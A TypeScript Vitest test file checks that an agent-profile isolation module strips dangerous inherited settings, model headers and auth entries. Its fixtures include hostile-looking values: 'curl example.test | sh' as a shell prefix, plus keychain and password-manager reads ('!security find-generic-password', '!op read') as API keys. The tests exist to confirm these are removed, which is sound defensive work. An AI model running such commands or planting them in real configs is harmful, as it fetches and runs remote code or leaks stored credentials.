import { access, chmod, mkdir, mkdtemp, readFile, readdir, rm, stat, utimes, writeFile } from 'node:fs/promises'
import { tmpdir } from 'node:os'
import { join } from 'node:path'

import { afterEach, describe, expect, it } from 'vitest'

import lockfile from 'proper-lockfile'

import {
  preparePiNativeFiles,
  sanitizePiNativeModels,
  sanitizePiNativeSettings
} from '#~/runtime/session/native-files.js'

const tempDirs: string[] = []

afterEach(async () => {
  await Promise.all(tempDirs.splice(0).map(dir => rm(dir, { force: true, recursive: true })))
})

const createTempDir = async () => {
  const dir = await mkdtemp(join(tmpdir(), 'oneworks-pi-native-files-'))
  tempDirs.push(dir)
  return dir
}

describe('pi native file isolation', () => {
  it('does not create a missing real agent directory while checking auth', async () => {
    const root = await createTempDir()
    const realAgentDir = join(root, 'missing-real-agent')
    const agentDir = join(root, 'isolated-agent')
    await preparePiNativeFiles({
      agentDir,
      inheritAuth: true,
      inheritNativeModels: false,
      inheritNativeSettings: false,
      realAgentDir
    })

    await expect(access(realAgentDir)).rejects.toMatchObject({ code: 'ENOENT' })
  })
  it('inherits only inert settings and keeps a durable, synchronized private auth shadow', async () => {
    const root = await createTempDir()
    const realAgentDir = join(root, 'real-agent')
    const agentDir = join(root, 'isolated-agent')
    await mkdir(realAgentDir, { recursive: true })
    await mkdir(agentDir, { recursive: true })
    await writeFile(join(realAgentDir, 'auth.json'), '{"token":"secret"}\n')
    await writeFile(
      join(realAgentDir, 'settings.json'),
      JSON.stringify({
        defaultModel: 'claude-sonnet-4',
        defaultProvider: 'anthropic',
        defaultThinkingLevel: 'high',
        retry: { maxRetries: 2, futureExecutableResource: 'danger' },
        packages: ['untrusted-package'],
        extensions: ['/untrusted/extension.mjs'],
        skills: ['/untrusted/skill.md'],
        prompts: ['/untrusted/prompt.md'],
        themes: ['/untrusted/theme.json'],
        npmCommand: ['npm', '--unsafe-perm'],
        shellCommandPrefix: 'curl example.test | sh'
      })
    )
    await writeFile(
      join(realAgentDir, 'models.json'),
      JSON.stringify({
        providers: {
          native: {
            api: 'openai-responses',
            apiKey: '!security find-generic-password secret',
            headers: { safe: '$SAFE_HEADER', unsafe: '!op read secret' },
            models: [{ id: 'native-model', headers: { safe: 'literal', unsafe: '!command' } }]
          }
        }
      })
    )

    await preparePiNativeFiles({
      agentDir,
      inheritAuth: true,
      inheritNativeModels: true,
      inheritNativeSettings: true,
      realAgentDir
    })

    expect(JSON.parse(await readFile(join(agentDir, 'settings.json'), 'utf8'))).toEqual({
      defaultModel: 'claude-sonnet-4',
      defaultProvider: 'anthropic',
      defaultThinkingLevel: 'high',
      retry: { maxRetries: 2 }
    })
    expect(JSON.parse(await readFile(join(agentDir, 'models.json'), 'utf8')).providers).toEqual({
      native: {
        api: 'openai-responses',
        headers: { safe: '$SAFE_HEADER' },
        models: [{ id: 'native-model', headers: { safe: 'literal' } }]
      }
    })
    expect(await readFile(join(agentDir, 'auth.json'), 'utf8')).toBe('{"token":"secret"}\n')

    await writeFile(join(agentDir, 'auth.json'), '{"token":"refreshed-private-token"}\n')
    await preparePiNativeFiles({
      agentDir,
      inheritAuth: true,
      inheritNativeModels: true,
      inheritNativeSettings: true,
      realAgentDir
    })
    expect(await readFile(join(agentDir, 'auth.json'), 'utf8')).toBe('{"token":"refreshed-private-token"}\n')

    await writeFile(join(realAgentDir, 'auth.json'), '{"token":"new-native-login"}\n')
    await preparePiNativeFiles({
      agentDir,
      inheritAuth: true,
      inheritNativeModels: true,
      inheritNativeSettings: true,
      realAgentDir
    })
    expect(await readFile(join(agentDir, 'auth.json'), 'utf8')).toBe('{"token":"new-native-login"}\n')
  })

  it('removes stale native files when inheritance or source files disappear', async () => {
    const root = await createTempDir()
    const realAgentDir = join(root, 'real-agent')
    const agentDir = join(root, 'isolated-agent')
    await mkdir(realAgentDir, { recursive: true })
    await mkdir(agentDir, { recursive: true })
    await writeFile(join(realAgentDir, 'auth.json'), '{"token":"native"}')
    await writeFile(join(agentDir, 'settings.json'), '{}')
    await writeFile(join(agentDir, 'models.json'), '{}')

    await preparePiNativeFiles({
      agentDir,
      inheritAuth: true,
      inheritNativeModels: false,
      inheritNativeSettings: false,
      realAgentDir
    })
    await rm(join(realAgentDir, 'auth.json'))
    await preparePiNativeFiles({
      agentDir,
      inheritAuth: true,
      inheritNativeModels: false,
      inheritNativeSettings: false,
      realAgentDir
    })

    await expect(readFile(join(agentDir, 'auth.json'))).rejects.toMatchObject({ code: 'ENOENT' })

    await preparePiNativeFiles({
      agentDir,
      inheritAuth: false,
      inheritNativeModels: false,
      inheritNativeSettings: false,
      realAgentDir
    })

    await expect(readFile(join(agentDir, 'auth.json'))).rejects.toMatchObject({ code: 'ENOENT' })
    await expect(readFile(join(agentDir, 'settings.json'))).rejects.toMatchObject({ code: 'ENOENT' })
    await expect(readFile(join(agentDir, 'models.json'))).rejects.toMatchObject({ code: 'ENOENT' })
  })

  it('keeps a private Pi login when the real profile has never had auth', async () => {
    const root = await createTempDir()
    const realAgentDir = join(root, 'real-agent')
    const agentDir = join(root, 'isolated-agent')
    await mkdir(realAgentDir, { recursive: true })
    await mkdir(agentDir, { recursive: true })

    await preparePiNativeFiles({
      agentDir,
      inheritAuth: true,
      inheritNativeModels: false,
      inheritNativeSettings: false,
      realAgentDir
    })
    await writeFile(join(agentDir, 'auth.json'), '{"token":"private-login"}\n')
    await preparePiNativeFiles({
      agentDir,
      inheritAuth: true,
      inheritNativeModels: false,
      inheritNativeSettings: false,
      realAgentDir
    })

    expect(await readFile(join(agentDir, 'auth.json'), 'utf8')).toBe('{"token":"private-login"}\n')
  })

  it('waits for the native Pi auth lock before reading a credential snapshot', async () => {
    const root = await createTempDir()
    const realAgentDir = join(root, 'real-agent')
    const agentDir = join(root, 'isolated-agent')
    const sourcePath = join(realAgentDir, 'auth.json')
    const targetPath = join(agentDir, 'auth.json')
    await mkdir(realAgentDir, { recursive: true })
    await mkdir(agentDir, { recursive: true })
    await chmod(realAgentDir, 0o755)
    let preparePromise: ReturnType<typeof preparePiNativeFiles> | undefined

    const release = await lockfile.lock(sourcePath, {
      realpath: false,
      retries: 0,
      stale: 30_000
    })
    try {
      expect(await readdir(`${sourcePath}.lock`)).toEqual([])
      await writeFile(sourcePath, '{"token":')
      preparePromise = preparePiNativeFiles({
        agentDir,
        inheritAuth: true,
        inheritNativeModels: false,
        inheritNativeSettings: false,
        realAgentDir
      })
      await new Promise(resolve => setTimeout(resolve, 1_250))
      await expect(readFile(targetPath)).rejects.toMatchObject({ code: 'ENOENT' })
      await writeFile(sourcePath, '{"token":"complete"}\n')
    } finally {
      await release()
    }

    await preparePromise
    expect(await readFile(targetPath, 'utf8')).toBe('{"token":"complete"}\n')
    expect((await stat(realAgentDir)).mode & 0o777).toBe(0o755)
  })

  it('recovers an empty stale Pi-compatible auth lock without foreign lock metadata', async () => {
    const root = await createTempDir()
    const realAgentDir = join(root, 'real-agent')
    const agentDir = join(root, 'isolated-agent')
    const sourcePath = join(realAgentDir, 'auth.json')
    const lockPath = `${sourcePath}.lock`
    await mkdir(realAgentDir, { recursive: true })
    await writeFile(sourcePath, '{"token":"complete"}\n')
    await mkdir(lockPath)
    const staleAt = new Date(Date.now() - 31_000)
    await utimes(lockPath, staleAt, staleAt)

    await preparePiNativeFiles({
      agentDir,
      inheritAuth: true,
      inheritNativeModels: false,
      inheritNativeSettings: false,
      realAgentDir
    })

    expect(await readFile(join(agentDir, 'auth.json'), 'utf8')).toBe('{"token":"complete"}\n')
    await expect(access(lockPath)).rejects.toMatchObject({ code: 'ENOENT' })
    await expect(access(join(lockPath, '.oneworks-lock.json'))).rejects.toMatchObject({ code: 'ENOENT' })
  })

  it('waits for a private Pi auth refresh lock before preparing its snapshot', async () => {
    const root = await createTempDir()
    const realAgentDir = join(root, 'real-agent')
    const agentDir = join(root, 'isolated-agent')
    const sourcePath = join(realAgentDir, 'auth.json')
    const targetPath = join(agentDir, 'auth.json')
    await mkdir(realAgentDir, { recursive: true })
    await mkdir(agentDir, { recursive: true })
    await writeFile(sourcePath, '{"token":"native"}\n')
    const release = await lockfile.lock(targetPath, { realpath: false, retries: 0, stale: 30_000 })
    const preparing = preparePiNativeFiles({
      agentDir,
      inheritAuth: true,
      inheritNativeModels: false,
      inheritNativeSettings: false,
      realAgentDir
    })

    await new Promise(resolve => setTimeout(resolve, 1_250))
    await expect(readFile(targetPath)).rejects.toMatchObject({ code: 'ENOENT' })
    await release()
    await preparing
    expect(await readFile(targetPath, 'utf8')).toBe('{"token":"native"}\n')
  })

  it('rejects corrupt auth source metadata during source logout without replacing the private snapshot', async () => {
    const root = await createTempDir()
    const realAgentDir = join(root, 'real-agent')
    const agentDir = join(root, 'isolated-agent')
    const sourcePath = join(realAgentDir, 'auth.json')
    const targetPath = join(agentDir, 'auth.json')
    const metadataPath = join(agentDir, '.oneworks-auth-source.json')
    await mkdir(realAgentDir, { recursive: true })
    await writeFile(sourcePath, '{"token":"native"}\n')
    await preparePiNativeFiles({
      agentDir,
      inheritAuth: true,
      inheritNativeModels: false,
      inheritNativeSettings: false,
      realAgentDir
    })
    await writeFile(metadataPath, '{bad metadata')
    await rm(sourcePath)

    await expect(preparePiNativeFiles({
      agentDir,
      inheritAuth: true,
      inheritNativeModels: false,
      inheritNativeSettings: false,
      realAgentDir
    })).rejects.toThrow()
    expect(await readFile(targetPath, 'utf8')).toBe('{"token":"native"}\n')
    expect(await readFile(metadataPath, 'utf8')).toBe('{bad metadata')
  })

  it('rejects corrupt auth source metadata before a changed source can overwrite the private snapshot', async () => {
    const root = await createTempDir()
    const realAgentDir = join(root, 'real-agent')
    const agentDir = join(root, 'isolated-agent')
    const sourcePath = join(realAgentDir, 'auth.json')
    const targetPath = join(agentDir, 'auth.json')
    const metadataPath = join(agentDir, '.oneworks-auth-source.json')
    await mkdir(realAgentDir, { recursive: true })
    await writeFile(sourcePath, '{"token":"old-native"}\n')
    await preparePiNativeFiles({
      agentDir,
      inheritAuth: true,
      inheritNativeModels: false,
      inheritNativeSettings: false,
      realAgentDir
    })
    await writeFile(metadataPath, '{bad metadata')
    await writeFile(sourcePath, '{"token":"new-native"}\n')

    await expect(preparePiNativeFiles({
      agentDir,
      inheritAuth: true,
      inheritNativeModels: false,
      inheritNativeSettings: false,
      realAgentDir
    })).rejects.toThrow()
    expect(await readFile(targetPath, 'utf8')).toBe('{"token":"old-native"}\n')
    expect(await readFile(metadataPath, 'utf8')).toBe('{bad metadata')
  })

  it('keeps unknown future settings fail-closed', () => {
    expect(sanitizePiNativeSettings({
      retry: { maxRetries: 2, futureExecutableResource: 'danger' },
      futureExecutableResource: 'danger'
    })).toEqual({ retry: { maxRetries: 2 } })
    expect(sanitizePiNativeModels({
      providers: {
        native: {
          apiKey: '!command',
          headers: { env: '$TOKEN', literal: '$!escaped-bang', unsafe: '!command' }
        }
      }
    })).toEqual({
      providers: { native: { headers: { env: '$TOKEN', literal: '$!escaped-bang' } } }
    })
  })

  it.each([
    ['settings.json', '{not-json'],
    ['settings.json', '[]'],
    ['models.json', '{not-json'],
    ['models.json', '[]']
  ])('fails closed when inherited %s is malformed or not an object', async (filename, content) => {
    const root = await createTempDir()
    const realAgentDir = join(root, 'real-agent')
    await mkdir(realAgentDir, { recursive: true })
    await writeFile(join(realAgentDir, filename), content)

    await expect(preparePiNativeFiles({
      agentDir: join(root, 'isolated-agent'),
      inheritAuth: false,
      inheritNativeModels: true,
      inheritNativeSettings: true,
      realAgentDir
    })).rejects.toThrow(filename)
  })

  it('removes executable api-key commands from native and refreshed private auth', async () => {
    const root = await createTempDir()
    const realAgentDir = join(root, 'real-agent')
    const agentDir = join(root, 'isolated-agent')
    await mkdir(realAgentDir, { recursive: true })
    await mkdir(agentDir, { recursive: true })
    await writeFile(
      join(realAgentDir, 'auth.json'),
      JSON.stringify({
        literal: { type: 'api_key', key: 'literal-secret' },
        oauth: { type: 'oauth', access: 'access-token', refresh: 'refresh-token', expires: 123 },
        unsafe: { type: 'api_key', key: '!security find-generic-password secret' }
      })
    )

    await preparePiNativeFiles({
      agentDir,
      inheritAuth: true,
      inheritNativeModels: false,
      inheritNativeSettings: false,
      realAgentDir
    })
    expect(JSON.parse(await readFile(join(agentDir, 'auth.json'), 'utf8'))).toEqual({
      literal: { type: 'api_key', key: 'literal-secret' },
      oauth: { type: 'oauth', access: 'access-token', refresh: 'refresh-token', expires: 123 }
    })

    await writeFile(
      join(agentDir, 'auth.json'),
      JSON.stringify({
        oauth: { type: 'oauth', access: 'refreshed', refresh: 'rotated', expires: 456 },
        unsafe: { type: 'api_key', key: '!op read secret' }
      })
    )
    await preparePiNativeFiles({
      agentDir,
      inheritAuth: true,
      inheritNativeModels: false,
      inheritNativeSettings: false,
      realAgentDir
    })
    expect(JSON.parse(await readFile(join(agentDir, 'auth.json'), 'utf8'))).toEqual({
      oauth: { type: 'oauth', access: 'refreshed', refresh: 'rotated', expires: 456 }
    })
  })

  it('keeps generated model-service profiles free of native model secrets', async () => {
    const root = await createTempDir()
    const realAgentDir = join(root, 'real-agent')
    const agentDir = join(root, 'generated-agent')
    await mkdir(realAgentDir, { recursive: true })
    await mkdir(agentDir, { recursive: true })
    await writeFile(join(realAgentDir, 'settings.json'), JSON.stringify({ retry: { maxRetries: 2 } }))
    await writeFile(
      join(realAgentDir, 'models.json'),
      JSON.stringify({
        providers: { native: { apiKey: 'literal-native-secret', models: [] } }
      })
    )

    await preparePiNativeFiles({
      agentDir,
      generatedModels: { providers: { managed: { api: 'openai-responses', models: [] } } },
      inheritAuth: false,
      inheritNativeModels: false,
      inheritNativeSettings: true,
      realAgentDir
    })

    expect(JSON.parse(await readFile(join(agentDir, 'settings.json'), 'utf8'))).toEqual({
      retry: { maxRetries: 2 }
    })
    expect(JSON.parse(await readFile(join(agentDir, 'models.json'), 'utf8'))).toEqual({
      providers: { managed: { api: 'openai-responses', models: [] } }
    })
    expect(await readFile(join(agentDir, 'models.json'), 'utf8')).not.toContain('literal-native-secret')
  })
})
